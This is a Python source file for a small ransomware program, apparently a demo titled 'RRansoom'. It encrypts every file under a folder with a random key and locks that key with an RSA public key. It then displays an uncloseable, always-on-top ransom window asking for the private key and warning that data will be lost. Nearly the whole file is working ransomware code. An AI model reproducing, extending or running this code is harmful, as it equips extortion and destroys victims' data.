#nocode
from encrypt_file import edFile
import os, time, random, rsa, sys
import tkinter as tk
from tkinter import messagebox
import concurrent.futures

time.clock = time.time

alphabets = "abcdefghijklmnopqrstuvwxyz1234567890=-_,./=+*"
global randomKey
randomKey = "".join(random.choices(alphabets, k = 128))

ed = edFile(randomKey)

def encrypt_folder(folder):

	def enc(folder):
		contents = os.listdir(folder)
		for c in contents:
			f = os.path.join(folder, c)
			if os.path.isfile(f):
				e = ed.encrypt(f)
				open(f, "wb").write(bytes(e, encoding = "utf-8"))
			else:
				pass

	l_of_folders = [f[0] for f in os.walk(folder)]

	with concurrent.futures.ThreadPoolExecutor() as executer:
		executer.map(enc, l_of_folders)

def encryptKey():
	global randomKey
	public_key = rsa.PublicKey.load_pkcs1(open("publicKey", "r").read().encode("utf8"))
	ed.key = rsa.encrypt(randomKey.encode("utf8"), public_key)
	randomKey = None

def decrypt_folder(folder = None, privKey = None):
	if privKey == None and folder == None:
		privKey = keyInp.get()
		folder = "Test_dir"
	if privKey != "":
		try:
			key = rsa.PrivateKey.load_pkcs1(open(privKey, "r").read().encode("utf8"))
			global root 
			if root:
				root.destroy()
				root = None
			contents = os.listdir(folder)

			for c in contents:
				f = os.path.join(folder, c)
				if os.path.isfile(f):
					e = open(f, "rb").read().decode()
					d = ed.decrypt(e, key)
					open(f, "wb").write(d)
				else:
					decrypt_folder(f, privKey)
		except FileNotFoundError:
			messagebox.showerror("Error", "file not found")
	
	else:
		messagebox.showwarning("Warning", "No path specified..")

if __name__ == "__main__":
	if sys.argv[1] and sys.argv[1] == "d":
		pass
	elif sys.argv[1] == "r":
		encrypt_folder("Test_dir")
		encryptKey()
	else:
		print("Incorrect option")
		sys.exit()

	global root
	root = tk.Tk()
	root.title("RRansoom")

	bgImg = tk.PhotoImage(file = "assets/header-ransomware.png")

	frame = tk.Frame(root, height = 600, width = 800)
	frame.pack()

	imLabel = tk.Label(frame, image = bgImg)
	imLabel.place(relx = 0, rely = 0, relwidth = 1, relheight = 1)
	
	warnLabel = tk.Label(frame, text = "Do not turn off your computer or click decrypt without right file path else data will be lost.. Read below for more info", bg = "#f75a3e", fg = "#fcf6de", font = ("Helvetica 15"))
	warnLabel.place(relx = 0.06, rely = 0.01, relwidth = 0.88, relheight = 0.1)
	
	keyLabel = tk.Label(frame, text = "Path to private key :", bg = "#9c75ff", fg = "#ffffff", relief = "solid", anchor = "w", padx = 10, font = ("Helvetica 13"))
	keyLabel.place(relx = 0.06, rely = 0.13, relwidth = 0.88, relheight = 0.08)
	
	keyInp = tk.Entry(frame, relief = "flat", highlightthickness = 1, highlightbackground = "red", highlightcolor = "red")
	keyInp.place(relx = 0.32, rely = 0.145, relwidth = 0.6, relheight = 0.05)
	
	orLabel = tk.Label(frame, text = "OR\nPlace the privateKey file on the Desktop for automatic decryption", font = ("Helvetica 13"), fg = "#ffffff", bg = "#ff9152")
	orLabel.place(relx = 0.15, rely = 0.3, relwidth = 0.7, relheight = 0.1)
	
	cButton = tk.Button(frame, text = "Decrypt", bg = "#8a8cff", fg = "#ffffff", relief = "solid", command = decrypt_folder)
	cButton.place(relx = 0.45, rely = 0.23, relwidth = 0.1, relheight = 0.05)
	
	instructions = open("inst.txt", "r").read()
	instLabel = tk.Label(frame, text = instructions, justify = tk.LEFT, wraplength = 700, font = ("Helvetica 13"), bg = "#363636", fg = "#ffffff")
	instLabel.place(relx = 0.03, rely = 0.42, relwidth = 0.94, relheight = 0.55)

	def disable_event():
		pass

	root.call('wm', 'attributes', '.', '-topmost', '1')
	root.protocol("WM_DELETE_WINDOW", disable_event)
	root.mainloop()